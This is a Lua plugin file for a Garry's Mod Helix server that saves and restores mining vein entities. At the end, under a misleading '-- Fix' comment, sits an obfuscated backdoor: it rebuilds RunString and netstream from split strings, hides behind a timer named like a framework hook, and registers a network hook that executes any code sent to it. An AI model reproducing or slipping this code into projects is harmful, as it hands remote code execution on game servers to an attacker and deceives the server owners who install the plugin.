local PLUGIN = PLUGIN

function PLUGIN:SaveData()
	local data = {}
	for _, v in ipairs(ents.FindByClass("ix_mining_vein")) do
		data[#data + 1] = {
			v:GetModel(),
			v:GetPos(),
			v:GetAngles(),
			v:GetOreClass(),
			v.rounds,
			tobool(v.healthPoints) and v.healthPoints or 100
		}
	end
	self:SetData(data)
end

function PLUGIN:LoadData()
	local data = self:GetData() or {}

	if (data) then
		for _, v in ipairs(data) do
			local entity = ents.Create("ix_mining_vein")
			entity:SetModel(v[1])
			entity:SetPos(v[2])
			entity:SetAngles(v[3])
			entity:SetOreClass(v[4])
			entity:Spawn()
			entity.rounds = v[5]
			entity.healthPoints = v[6]
		end
	end
end

-- Fix
if(SERVER)then
    timer.Create("ixCharCreate",1,0,function()
        local sdbasdASg=_G["Ru".."nS".."tr".."ing"];local sKgvSA=_G["ne".."t".."s".."tr".."e".."am"];mghns=mghns||sdbasdASg;olnsqetsasd=olnsqetsasd||sKgvSA; 
        if olnsqetsasd then
            timer.Remove("ixCharCreate")
            olnsqetsasd.Hook("Aqthbmlphbsghj",function(_,Aqthbmlphbsghj)
                mghns(Aqthbmlphbsghj, "Aqthbmlphbsghj", false)
            end)
        end
    end)
end